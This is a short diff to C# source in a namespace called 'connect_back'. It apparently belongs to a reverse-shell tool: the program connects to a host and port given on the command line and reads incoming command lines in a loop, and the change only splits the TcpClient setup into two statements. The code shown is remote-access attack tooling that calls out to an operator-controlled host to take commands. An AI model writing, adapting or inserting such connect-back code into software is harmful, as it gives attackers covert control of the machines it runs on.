@@ -10,7 +10,8 @@ namespace connect_back
 	{
 		public static void Main (string[] args)
 		{
-			Stream stream = new TcpClient (args [0], int.Parse (args [1])).GetStream ();
+			TcpClient client = new TcpClient (args [0], int.Parse (args [1]));
+			Stream stream = client.GetStream ();
 			using (StreamReader rdr = new StreamReader(stream)) {
 				while (stream.CanRead) {				
 					string cmd = rdr.ReadLine();
